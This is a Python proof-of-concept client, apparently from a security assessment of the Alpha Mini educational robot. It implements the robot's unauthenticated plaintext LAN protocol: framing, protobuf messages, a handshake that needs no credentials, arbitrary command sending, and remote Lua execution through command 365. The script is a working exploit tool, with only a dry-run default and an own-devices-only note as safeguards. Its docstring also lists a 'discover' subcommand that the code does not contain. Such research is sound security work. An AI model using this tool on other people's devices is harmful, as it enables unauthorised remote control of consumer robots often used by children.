#!/usr/bin/env python3
"""Alpha Mini（悟空 教育版）局域网通道客户端 —— docs/10 协议规格的可执行实现。

用途：验证 U-03（局域网通道无鉴权）/ U-04（明文无 TLS）/ U-29（KickOff）/ U-30（Lua 执行）。
边界：**仅用于自有设备**。默认 dry-run，只有显式 --send 才真发。

  发现：  python3 lan_channel_client.py discover --src <本机IP>
  握手：  python3 lan_channel_client.py handshake --host <ip> --port <port> --send
  只读：  python3 lan_channel_client.py cmd --host .. --port .. --cmd 1 --send
  Lua：   python3 lan_channel_client.py lua --host .. --port .. --script 'return 1' --send

帧格式与消息层见 docs/10_局域网通道协议规格与PoC交接.md §3-§5。
"""
import argparse
import socket
import struct
import sys
import time
import uuid as _uuid

MAGIC = b"\xFB\xBF"
TAIL = b"\x01\xED"

# ---------------------------------------------------------------- protobuf 最小编解码


def _varint(n: int) -> bytes:
    out = b""
    while True:
        b = n & 0x7F
        n >>= 7
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            return out


def _tag(field: int, wire: int) -> bytes:
    return _varint((field << 3) | wire)


def pb_str(field: int, s: str) -> bytes:
    b = s.encode()
    return _tag(field, 2) + _varint(len(b)) + b


def pb_bytes(field: int, b: bytes) -> bytes:
    return _tag(field, 2) + _varint(len(b)) + b


def pb_i32(field: int, n: int) -> bytes:
    return _tag(field, 0) + _varint(n)


def _read_varint(buf: bytes, i: int):
    n = shift = 0
    while i < len(buf):
        b = buf[i]
        i += 1
        n |= (b & 0x7F) << shift
        if not b & 0x80:
            return n, i
        shift += 7
    raise ValueError("truncated varint")


def pb_decode(buf: bytes) -> dict:
    """通用 protobuf 解码：{字段号: [值,...]}。值为 int / bytes。不需要 .proto。"""
    out = {}
    i = 0
    while i < len(buf):
        try:
            key, i = _read_varint(buf, i)
        except ValueError:
            break
        field, wire = key >> 3, key & 7
        if wire == 0:
            v, i = _read_varint(buf, i)
        elif wire == 2:
            ln, i = _read_varint(buf, i)
            v, i = buf[i:i + ln], i + ln
        elif wire == 5:
            v, i = struct.unpack("<I", buf[i:i + 4])[0], i + 4
        elif wire == 1:
            v, i = struct.unpack("<Q", buf[i:i + 8])[0], i + 8
        else:
            break
        out.setdefault(field, []).append(v)
    return out


def _s(d: dict, f: int, default=""):
    v = d.get(f)
    if not v:
        return default
    return v[0].decode("utf-8", "replace") if isinstance(v[0], bytes) else v[0]


def _n(d: dict, f: int, default=0):
    v = d.get(f)
    return v[0] if v else default


# ---------------------------------------------------------------- 帧层（docs/10 §3）


def pack(payload: bytes, version: int = 1) -> bytes:
    """length = len(payload)+6，大端，覆盖 FB BF ver len payload 01，不含结束符 ED。"""
    return MAGIC + bytes([version]) + struct.pack(">H", len(payload) + 6) + payload + TAIL


def unpack_stream(buf: bytes):
    """尽可能多地取出完整帧 payload，返回 (payloads, 剩余buf)。"""
    out = []
    while True:
        i = buf.find(MAGIC)
        if i < 0 or len(buf) - i < 7:
            break
        length = struct.unpack(">H", buf[i + 3:i + 5])[0]
        if len(buf) - i < length + 1:
            break
        out.append(buf[i + 5:i + length - 1])
        buf = buf[i + length + 1:]
    return out, buf


# ---------------------------------------------------------------- 消息层（docs/10 §4）

MSG_TYPE_REQUEST = 2


def envelope(cmd_id: int, send_serial: int, body: bytes, msg_type: int = MSG_TYPE_REQUEST) -> bytes:
    """与 PacketUtil.buildMiniMessage() 一致：header 只填 commandId/sendSerial/responseSerial/msgType。"""
    header = (pb_i32(1, cmd_id) + pb_i32(2, send_serial) + pb_i32(3, 0) + pb_i32(5, msg_type))
    return pb_bytes(1, header) + pb_bytes(2, body)


def parse_message(payload: bytes) -> dict:
    m = pb_decode(payload)
    hdr = pb_decode(m[1][0]) if 1 in m else {}
    return {
        "commandId": _n(hdr, 1),
        "sendSerial": _n(hdr, 2),
        "responseSerial": _n(hdr, 3),
        "versionCode": _n(hdr, 4),
        "msgType": _n(hdr, 5),
        "resultCode": _n(hdr, 6),
        "bodyData": m[2][0] if 2 in m else b"",
    }


def handshake_body(lan="zh", ver="1.0.0", vcode=1, country="CN", devtype=1,
                   uuid_=None, session="") -> bytes:
    """BluetoothHandShakeRequest —— 注意：无 token / 签名 / 配对码字段。"""
    return (pb_str(1, lan) + pb_str(2, ver) + pb_i32(3, vcode) +
            pb_str(4, country) + pb_i32(5, devtype) +
            pb_str(6, uuid_ or str(_uuid.uuid4())) + pb_str(7, session))


def decode_shake_response(body: bytes) -> dict:
    d = pb_decode(body)
    return {
        "isSuccess": bool(_n(d, 1)),
        "resultCode": bool(_n(d, 2)),
        "sysLan": _s(d, 3),
        "sysCountry": _s(d, 4),
        "robotSoftVersionName": _s(d, 5),
        "btInterfaceVersion": _n(d, 6),
        "androidFirmwareVersion": _s(d, 7),
        "errorCode": _n(d, 8),
        "sessionId": _s(d, 9),
        "versionInfo": _s(d, 10),
    }


# ---------------------------------------------------------------- 连接


class Channel:
    def __init__(self, host, port, timeout=10.0, verbose=True):
        self.host, self.port, self.verbose = host, port, verbose
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buf = b""
        self.serial = 0
        self.last_tx = time.time()
        self.closed = False        # 对端关闭后置位，避免调用方在死连接上自旋

    def heartbeat(self):
        """链路层心跳：payload 单字节，解码器直接吞掉（DecodePacketHandler.firePacket）。
        必须 <7s 发一次，否则 IdleStateHandler 读空闲会关连接。"""
        self.sock.sendall(pack(b"\x00"))
        self.last_tx = time.time()

    def send(self, cmd_id: int, body: bytes = b"") -> int:
        self.serial += 1
        frame = pack(envelope(cmd_id, self.serial, body))
        self.last_tx = time.time()
        if self.verbose:
            print(f"  → cmd={cmd_id} serial={self.serial} frame={len(frame)}B "
                  f"hex={frame[:32].hex()}{'…' if len(frame) > 32 else ''}")
        self.sock.sendall(frame)
        return self.serial

    def recv(self, wait=3.0):
        """收集 wait 秒内的所有消息。"""
        msgs, end = [], time.time() + wait
        if self.closed:
            return msgs
        while time.time() < end:
            if time.time() - self.last_tx > 4.0:      # 保活，见 heartbeat()
                try:
                    self.heartbeat()
                except OSError:
                    self.closed = True
                    break
            self.sock.settimeout(min(1.0, max(0.2, end - time.time())))
            try:
                data = self.sock.recv(65535)
            except socket.timeout:
                continue
            except OSError as e:
                print(f"  ! socket error: {e}", file=sys.stderr)
                self.closed = True
                break
            if not data:
                print("  ! 对端关闭连接", file=sys.stderr)
                self.closed = True
                break
            self.buf += data
            payloads, self.buf = unpack_stream(self.buf)
            for p in payloads:
                if len(p) <= 1:          # §3：payload 长度 1 = 心跳
                    continue
                msgs.append(parse_message(p))
        return msgs

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


# ---------------------------------------------------------------- 子命令

# PacketMessageHandler.channelRead0：header.commandId == 0 ⇒ 走 onHandShake()。
# 34/35（BL_HAND_SHAKE_*）是 BLE 通道的命令号，LAN 上无效。
CMD_HANDSHAKE = 0
CMD_HANDSHAKE_RESP = 1000        # LanServer.replyHandShakePacket*() 固定用 1000
CMD_HEARTBEAT = 30
CMD_RUN_LUA = 365


def do_handshake(ch: Channel, wait=4.0):
    ch.send(CMD_HANDSHAKE, handshake_body())
    msgs = ch.recv(wait)
    for m in msgs:
        if m["commandId"] == CMD_HANDSHAKE_RESP:
            return m, decode_shake_response(m["bodyData"])
    return (msgs[0] if msgs else None), None


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="mode", required=True)

    p = sub.add_parser("handshake", help="L0：握手，读固件版本")

    p2 = sub.add_parser("cmd", help="L0/L1：握手后发任意命令号（可逗号分隔多个）")
    p2.add_argument("--cmd", required=True, help="如 9 或 9,68,320")
    p2.add_argument("--str1", help="给 body 填一个 string 字段1（可选）")

    p3 = sub.add_parser("lua", help="L2：执行 Lua（仅在需要定性 U-30 时用）")
    p3.add_argument("--script", required=True)

    for q in (p, p2, p3):
        q.add_argument("--host", required=True)
        q.add_argument("--port", type=int, required=True)
        q.add_argument("--send", action="store_true", help="真发；不加则 dry-run")
        q.add_argument("--wait", type=float, default=4.0)

    a = ap.parse_args()

    if a.mode == "handshake":
        cmds, body = [], b""
    elif a.mode == "cmd":
        cmds, body = [int(c) for c in a.cmd.split(",")], (pb_str(1, a.str1) if a.str1 else b"")
    else:
        cmds, body = [CMD_RUN_LUA], pb_str(1, a.script)

    preview = pack(envelope(cmds[0] if cmds else CMD_HANDSHAKE, 1,
                            body if cmds else handshake_body()))
    print(f"target={a.host}:{a.port} cmds={cmds or ['handshake(0)']} "
          f"首帧({len(preview)}B) = {preview.hex()}")
    if not a.send:
        print("[dry-run] 未发送。确认无误后加 --send", file=sys.stderr)
        return 0

    ch = Channel(a.host, a.port)
    print(f"[+] TCP 已连接 {a.host}:{a.port}")
    try:
        m, r = do_handshake(ch, a.wait)
        if r is None:
            print(f"[-] 握手无响应/未识别；原始消息={m}")
            return 2
        print(f"[+] 握手响应 cmd={m['commandId']} resultCode={m['resultCode']}")
        for k, v in r.items():
            print(f"      {k:<24}= {v!r}")
        if not r["isSuccess"]:
            print("[-] isSuccess=False，后续命令跳过")
            return 3

        for cmd in cmds:
            print(f"[*] 握手成功，发送业务命令 {cmd}")
            ch.send(cmd, body)
            got = ch.recv(a.wait)
            if not got:
                print("      (无响应)")
            for m2 in got:
                print(f"[+] resp cmd={m2['commandId']} resultCode={m2['resultCode']} "
                      f"bodyLen={len(m2['bodyData'])}")
                d = pb_decode(m2["bodyData"])
                for f, vals in sorted(d.items()):
                    show = [v[:80] if isinstance(v, bytes) else v for v in vals[:5]]
                    print(f"      field {f}: {show}{' …' if len(vals) > 5 else ''}")
    finally:
        ch.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
